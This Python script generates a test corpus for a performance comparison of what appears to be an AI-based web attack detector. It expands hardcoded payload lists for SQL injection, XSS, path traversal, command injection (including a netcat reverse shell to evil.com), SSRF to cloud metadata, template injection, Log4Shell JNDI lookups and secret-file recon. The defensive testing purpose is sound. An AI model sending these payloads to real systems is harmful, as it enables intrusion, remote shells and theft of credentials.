#!/usr/bin/env python3
"""Generate an expanded test corpus for the AI-compare perf run.

Loads the curated datasets at
`tests/security/dataset/{attacks_v3,clean_baselines}.json`
(203 attacks + 24 clean cases) and inflates them with permutations
(parameter substitution, encoding variants, path enumeration) so
the perf comparison drives a few thousand UNIQUE cases instead of
cycling through the same 25 hard-coded shapes.

Output: tests/perf/ai-corpus.json — a flat array of:
  {"kind": "attack"|"clean", "method": "GET"|"POST"|...,
   "path": "/...", "query": "...", "body": null|"...",
   "user_agent": null|"...", "content_type": null|"..."}
k6 reads it via SharedArray + open().
"""
from __future__ import annotations

import itertools
import json
import os
import random
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent.parent
ATTACKS = ROOT / "tests" / "security" / "dataset" / "attacks_v3.json"
CLEAN   = ROOT / "tests" / "security" / "dataset" / "clean_baselines.json"
OUT     = ROOT / "tests" / "perf" / "ai-corpus.json"

random.seed(0xA1E615)  # deterministic — reproducible runs


# ─── Helpers ────────────────────────────────────────────────────

def load(p: Path) -> dict:
    return json.loads(p.read_text())


def case(kind: str, method: str, path: str,
         query: str = "", body: str | None = None,
         user_agent: str | None = None,
         content_type: str | None = None,
         extra_header: tuple[str, str] | None = None) -> dict:
    return {
        "kind": kind,
        "method": method,
        "path": path,
        "query": query,
        "body": body,
        "user_agent": user_agent,
        "content_type": content_type,
        "extra_header": list(extra_header) if extra_header else None,
    }


# ─── 1. Base cases — load from curated JSON ─────────────────────

def load_base() -> tuple[list[dict], list[dict]]:
    attacks_raw = load(ATTACKS)
    clean_raw = load(CLEAN)

    a_out: list[dict] = []
    for cls, blob in attacks_raw.items():
        if cls == "_meta" or not isinstance(blob, dict):
            continue
        for c in blob.get("cases", []):
            hdrs = c.get("headers", {}) or {}
            ua = hdrs.pop("User-Agent", None)
            content_type = c.get("content_type")
            # If headers still contain anything (e.g. log4shell uses
            # X-Api-Version: ${jndi:...}), pick the first non-UA one
            # and pass it through as extra_header.
            extra = next(iter(hdrs.items()), None) if hdrs else None
            a_out.append(case(
                kind="attack",
                method=c["method"],
                path=c["path"],
                query=c.get("query", "") or "",
                body=c.get("body"),
                user_agent=ua,
                content_type=content_type,
                extra_header=extra,
            ))

    c_out: list[dict] = []
    for cat, blob in clean_raw.items():
        if cat == "_meta" or not isinstance(blob, dict):
            continue
        for c in blob.get("cases", []):
            hdrs = c.get("headers", {}) or {}
            ua = c.get("user_agent") or hdrs.pop("User-Agent", None)
            content_type = c.get("content_type")
            extra = next(iter(hdrs.items()), None) if hdrs else None
            c_out.append(case(
                kind="clean",
                method=c["method"],
                path=c["path"],
                query=c.get("query", "") or "",
                body=c.get("body"),
                user_agent=ua,
                content_type=content_type,
                extra_header=extra,
            ))

    return a_out, c_out


# ─── 2. Attack expansions ───────────────────────────────────────

SQLI_PAYLOADS = [
    "1'%20OR%20'1'='1",
    "admin'--",
    "1%20UNION%20SELECT%20null%2Cnull--",
    "1%20OR%201=1--",
    "1)%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
    "1%27%20AND%20SLEEP(5)--",
    "1%3B%20DROP%20TABLE%20users--",
    "%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--",
    "1%27%20OR%201%3D1%20LIMIT%201--",
    "1%27)%20UNION%20SELECT%20database()--",
    "%27%20OR%20%27a%27%3D%27a",
    "1%20AND%20EXTRACTVALUE(0%2CCONCAT(0x5C%2Cdatabase()))",
    "1%20AND%201%3DCONVERT(int%2C(SELECT%20TOP%201%20name%20FROM%20sysdatabases))",
]
SQLI_PARAMS = ["id", "user", "name", "q", "search", "uid", "pid", "page"]
SQLI_PATHS  = ["/login", "/api/users", "/search", "/products",
               "/admin/login", "/api/v1/users", "/auth", "/user",
               "/api/v2/account", "/profile"]

XSS_PAYLOADS = [
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "%3Csvg%2Fonload%3Dalert(1)%3E",
    "%3Ciframe%20src%3Djavascript%3Aalert(1)%3E",
    "%3Cbody%20onload%3Dalert(1)%3E",
    "javascript%3Aalert(document.cookie)",
    "%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%3Cdiv%20style%3D%22background%3Aurl(javascript%3Aalert(1))%22%3E",
    "%3Cinput%20autofocus%20onfocus%3Dalert(1)%3E",
    "%3Cobject%20data%3Djavascript%3Aalert(1)%3E",
    "%3Cscript%20src%3D%2F%2Fevil.com%2Fx.js%3E%3C%2Fscript%3E",
]
XSS_PARAMS = ["q", "search", "name", "msg", "comment", "title",
              "text", "content", "input", "value"]
XSS_PATHS  = ["/search", "/comment", "/post", "/api/messages",
              "/feedback", "/profile/update", "/page", "/forum/new"]

PTRAV_TARGETS = [
    "etc/passwd", "etc/shadow", "etc/hosts", "etc/group",
    "windows/system32/drivers/etc/hosts",
    "windows/win.ini", "boot.ini", "proc/self/environ",
    "proc/version", "var/log/apache2/access.log",
    "WEB-INF/web.xml", ".htaccess", ".git/config",
]
PTRAV_PARAMS = ["file", "path", "p", "doc", "page", "include",
                "name", "template", "view"]
PTRAV_PATHS  = ["/download", "/files", "/view", "/fetch",
                "/include", "/api/file", "/static/get",
                "/uploads/file", "/api/document"]


def sqli_variants(n: int) -> list[dict]:
    out = []
    for _ in range(n):
        p = random.choice(SQLI_PATHS)
        param = random.choice(SQLI_PARAMS)
        payload = random.choice(SQLI_PAYLOADS)
        # 1/4 of cases as POST body, the rest as GET query
        as_post = random.random() < 0.25
        if as_post:
            out.append(case("attack", "POST", p,
                            body=f"{param}={payload}",
                            content_type="application/x-www-form-urlencoded"))
        else:
            out.append(case("attack", "GET", p, query=f"{param}={payload}"))
    return out


def xss_variants(n: int) -> list[dict]:
    out = []
    for _ in range(n):
        p = random.choice(XSS_PATHS)
        param = random.choice(XSS_PARAMS)
        payload = random.choice(XSS_PAYLOADS)
        as_post = random.random() < 0.3
        if as_post:
            out.append(case("attack", "POST", p,
                            body=f"{param}={payload}",
                            content_type="application/x-www-form-urlencoded"))
        else:
            out.append(case("attack", "GET", p, query=f"{param}={payload}"))
    return out


def ptrav_variants(n: int) -> list[dict]:
    out = []
    for _ in range(n):
        p = random.choice(PTRAV_PATHS)
        param = random.choice(PTRAV_PARAMS)
        target = random.choice(PTRAV_TARGETS)
        depth = random.randint(2, 8)
        encoded = random.random() < 0.4
        if encoded:
            dotdot = "%2E%2E%2F" * depth
            target_enc = target.replace("/", "%2F")
            payload = f"{dotdot}{target_enc}"
        else:
            payload = "../" * depth + target
            payload = payload.replace("/", "%2F").replace("..", "%2E%2E")
        out.append(case("attack", "GET", p, query=f"{param}={payload}"))
    return out


def cmd_inj_variants(n: int) -> list[dict]:
    paths = ["/ping", "/api/lookup", "/diagnostic", "/api/dns",
             "/util/exec", "/cmd"]
    params = ["host", "addr", "ip", "target", "domain", "cmd"]
    targets = ["8.8.8.8", "1.1.1.1", "127.0.0.1", "localhost"]
    payloads = [
        ";cat+/etc/passwd", ";id", ";uname+-a", "%26%26+id",
        "%7C+cat+%2Fetc%2Fpasswd", "%60id%60", "%24(id)",
        ";nc+-e+%2Fbin%2Fsh+evil.com+4444", ";whoami",
        "%3B%20curl%20http%3A%2F%2Fevil.com",
    ]
    out = []
    for _ in range(n):
        out.append(case("attack", "GET", random.choice(paths),
                        query=f"{random.choice(params)}={random.choice(targets)}{random.choice(payloads)}"))
    return out


def ssrf_variants(n: int) -> list[dict]:
    paths = ["/api/fetch", "/proxy", "/webhook/test",
             "/preview", "/import", "/api/url"]
    params = ["url", "target", "src", "next", "redirect_url",
              "callback", "endpoint"]
    targets = [
        "http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F",
        "http%3A%2F%2Flocalhost%3A8080%2Fadmin",
        "http%3A%2F%2F127.0.0.1%3A6379%2Finfo",
        "file%3A%2F%2F%2Fetc%2Fpasswd",
        "gopher%3A%2F%2F127.0.0.1%3A6379%2F_",
        "dict%3A%2F%2F127.0.0.1%3A11211%2Fstats",
        "http%3A%2F%2F0.0.0.0%3A22%2F",
        "http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin",
    ]
    out = []
    for _ in range(n):
        out.append(case("attack", "GET", random.choice(paths),
                        query=f"{random.choice(params)}={random.choice(targets)}"))
    return out


def recon_variants(n: int) -> list[dict]:
    # Common recon URLs — these are mostly path-only.
    common = [
        ".env", ".env.local", ".env.prod", ".env.production",
        ".git/config", ".git/HEAD", ".git/index",
        ".svn/entries", ".hg/store/00manifest.i",
        ".DS_Store", ".vscode/settings.json", ".idea/workspace.xml",
        "wp-admin/setup-config.php", "wp-config.php",
        "wp-login.php", "phpinfo.php", "info.php",
        "admin/login.php", "administrator/index.php",
        "phpmyadmin/index.php", "pma/index.php",
        "config.php", "config.inc.php", "configuration.php",
        "backup.zip", "backup.tar.gz", "backup.sql",
        "dump.sql", "database.sql",
        "private-key.pem", "id_rsa", "server.key",
        ".bash_history", ".ssh/authorized_keys",
        "actuator/health", "actuator/env", "actuator/heapdump",
        "actuator/loggers", "actuator/mappings",
        "console/", "h2-console/", "management/",
        "swagger-ui.html", "swagger/index.html",
        "v2/api-docs", "api-docs", "api/swagger.json",
        "WEB-INF/web.xml", "META-INF/MANIFEST.MF",
        "robots.txt.bak", "sitemap.xml.bak",
        ".well-known/security.txt.old",
        "old/", "old.zip", "test.zip",
        "_vti_inf.html", "_vti_pvt/service.pwd",
        "crossdomain.xml", "clientaccesspolicy.xml",
    ]
    out = []
    for _ in range(n):
        target = random.choice(common)
        out.append(case("attack", "GET", "/" + target))
    return out


def ssti_variants(n: int) -> list[dict]:
    payloads = [
        "%7B%7B7*7%7D%7D",                              # {{7*7}}
        "%24%7B7*7%7D",                                 # ${7*7}
        "%23%7B7*7%7D",                                 # #{7*7}
        "%3C%25%3D7*7%25%3E",                           # <%=7*7%>
        "%7B%7Bconfig%7D%7D",                           # {{config}}
        "%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__()%7D%7D",
        "%7B%7Brequest.application.__globals__%7D%7D",
        "%24%7BT(java.lang.Runtime).getRuntime().exec(%27id%27)%7D",
        "%7B%7Bself%7D%7D",
        "%7B%7Bcycler.next%7D%7D",
    ]
    params = ["name", "template", "q", "search", "tpl", "page"]
    paths = ["/template", "/render", "/page", "/api/render", "/search"]
    out = []
    for _ in range(n):
        out.append(case("attack", "GET", random.choice(paths),
                        query=f"{random.choice(params)}={random.choice(payloads)}"))
    return out


def log4shell_variants(n: int) -> list[dict]:
    headers = ["User-Agent", "X-Api-Version", "X-Forwarded-For",
               "Referer", "X-Original-URL", "X-Requested-With",
               "Authorization"]
    payloads = [
        "${jndi:ldap://evil.com/a}",
        "${jndi:rmi://attacker.example:1099/x}",
        "${jndi:dns://exfil.evil.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
        "${${lower:j}ndi:ldap://evil.com/y}",
        "${jndi:ldap://${env:USER}.evil.com/}",
        "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/a}",
    ]
    paths = ["/", "/api/health", "/login", "/index.html"]
    out = []
    for _ in range(n):
        h = random.choice(headers)
        p = random.choice(payloads)
        path = random.choice(paths)
        if h == "User-Agent":
            out.append(case("attack", "GET", path, user_agent=p))
        else:
            out.append(case("attack", "GET", path, extra_header=(h, p)))
    return out


def open_redirect_variants(n: int) -> list[dict]:
    params = ["next", "url", "redirect", "redirect_uri",
              "return_to", "back", "callback", "to", "continue"]
    targets = [
        "http://evil.com", "//evil.com", "https://evil.com",
        "http://evil.com.example.com", "javascript:alert(1)",
        "http%3A%2F%2Fevil.com", "%2F%2Fevil.com",
        "data:text/html,<script>alert(1)</script>",
        "http://127.0.0.1@evil.com",
    ]
    paths = ["/redirect", "/go", "/out", "/api/redirect",
             "/oauth/authorize", "/logout"]
    out = []
    for _ in range(n):
        out.append(case("attack", "GET", random.choice(paths),
                        query=f"{random.choice(params)}={random.choice(targets)}"))
    return out


def scanner_variants(n: int) -> list[dict]:
    uas = [
        "sqlmap/1.7.2#stable", "nikto/2.5.0",
        "Nmap Scripting Engine; https://nmap.org/book/nse.html",
        "masscan/1.3.2", "Acunetix-Aspect", "OpenVAS",
        "Mozilla/4.0 (compatible; Nessus)",
        "dirbuster", "gobuster/3.6", "wfuzz/3.1.0",
        "ZAP/2.14.0", "Burp Suite Professional/2024.1",
        "commix/v3.7-stable", "w3af.org",
    ]
    paths = ["/", "/admin", "/wp-admin", "/login", "/api/v1/health",
             "/server-status", "/robots.txt"]
    out = []
    for _ in range(n):
        out.append(case("attack", "GET", random.choice(paths),
                        user_agent=random.choice(uas)))
    return out


# ─── 3. Clean expansions ────────────────────────────────────────

CLEAN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 Mobile",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/124.0 Mobile",
    "GitHub-Hookshot/abc123",
    "Slack/4.36.140 (Macintosh)",
    "okhttp/4.12.0",
    "curl/8.7.1",
    "PostmanRuntime/7.39.0",
]


def clean_api_variants(n: int) -> list[dict]:
    paths = ["/api/users", "/api/v1/users", "/api/orders",
             "/api/products", "/api/v2/accounts", "/api/files",
             "/api/sessions", "/api/health", "/api/metrics",
             "/api/v1/dashboards", "/api/v1/reports"]
    methods = ["GET", "GET", "GET", "POST", "PUT", "DELETE"]
    out = []
    for _ in range(n):
        m = random.choice(methods)
        p = random.choice(paths)
        # Append ID for some
        if random.random() < 0.4:
            p = f"{p}/{random.randint(1, 9999)}"
        q = ""
        body = None
        ct = None
        if m == "GET" and random.random() < 0.5:
            q = (f"page={random.randint(1, 50)}&"
                 f"limit={random.choice([10, 20, 50, 100])}&"
                 f"sort={random.choice(['name', 'created_at', '-created_at', 'id'])}")
        elif m in ("POST", "PUT"):
            body = json.dumps({
                "name": random.choice(["alice", "bob", "charlie", "dave"]),
                "qty": random.randint(1, 100),
                "active": random.choice([True, False]),
            })
            ct = "application/json"
        out.append(case("clean", m, p, query=q, body=body,
                        content_type=ct, user_agent=random.choice(CLEAN_UAS)))
    return out


def clean_static_variants(n: int) -> list[dict]:
    suffixes = [
        ".css", ".js", ".png", ".jpg", ".webp", ".woff2",
        ".svg", ".ico", ".map", ".json", ".html",
    ]
    folders = ["static", "assets", "public", "dist", "build",
               "media", "uploads/thumb"]
    names = ["main", "app", "vendor", "runtime", "polyfills",
             "styles", "common", "logo", "banner", "icon",
             "favicon", "manifest", "sw"]
    out = []
    for _ in range(n):
        folder = random.choice(folders)
        name = random.choice(names)
        suffix = random.choice(suffixes)
        hashy = random.choice(["", f".{random.randint(100, 999)}",
                              f".{''.join(random.choices('0123456789abcdef', k=8))}"])
        out.append(case("clean", "GET",
                        f"/{folder}/{name}{hashy}{suffix}",
                        user_agent=random.choice(CLEAN_UAS)))
    return out


def clean_keywords_variants(n: int) -> list[dict]:
    # Benign queries that contain words that LOOK suspicious.
    searches = [
        "shell+script+tutorial", "select+best+products",
        "union+jack+history", "drop+shipping+guide",
        "cookie+recipe", "script+writing+101",
        "insert+coin+game", "alert+system+design",
        "delete+key+windows", "from+software+games",
        "iframe+css+layout", "javascript+book",
        "xss+prevention+cheatsheet", "union+types+typescript",
    ]
    paths = ["/search", "/api/search", "/find", "/blog/search",
             "/products", "/docs/search"]
    out = []
    for _ in range(n):
        out.append(case("clean", "GET", random.choice(paths),
                        query=f"q={random.choice(searches)}",
                        user_agent=random.choice(CLEAN_UAS)))
    return out


def clean_browse_variants(n: int) -> list[dict]:
    paths = [
        "/", "/index.html", "/about", "/contact",
        "/products", "/services", "/blog", "/news",
        "/help", "/support", "/faq", "/terms",
        "/privacy", "/sitemap.xml", "/robots.txt",
    ]
    out = []
    for _ in range(n):
        out.append(case("clean", "GET", random.choice(paths),
                        user_agent=random.choice(CLEAN_UAS)))
    return out


# ─── Main ───────────────────────────────────────────────────────

def main() -> int:
    base_attacks, base_clean = load_base()
    print(f"base: {len(base_attacks)} attacks, {len(base_clean)} clean",
          file=sys.stderr)

    attacks = list(base_attacks)
    clean = list(base_clean)

    # Attack expansion targets — roughly proportional to threat
    # importance.  Total: ~2000 attacks.
    attacks += sqli_variants(350)
    attacks += xss_variants(300)
    attacks += ptrav_variants(200)
    attacks += cmd_inj_variants(200)
    attacks += ssrf_variants(150)
    attacks += recon_variants(350)
    attacks += ssti_variants(120)
    attacks += log4shell_variants(120)
    attacks += open_redirect_variants(80)
    attacks += scanner_variants(130)

    # Clean expansion — total ~1000.
    clean += clean_api_variants(400)
    clean += clean_static_variants(250)
    clean += clean_keywords_variants(200)
    clean += clean_browse_variants(150)

    # Shuffle (deterministic since seed is fixed).
    random.shuffle(attacks)
    random.shuffle(clean)

    out = {
        "meta": {
            "attacks": len(attacks),
            "clean": len(clean),
            "total": len(attacks) + len(clean),
            "seed": "0xA1E615",
        },
        "attacks": attacks,
        "clean": clean,
    }

    OUT.write_text(json.dumps(out, ensure_ascii=False))
    print(f"wrote {OUT} : {len(attacks)} attacks + {len(clean)} clean = "
          f"{len(attacks) + len(clean)} cases", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
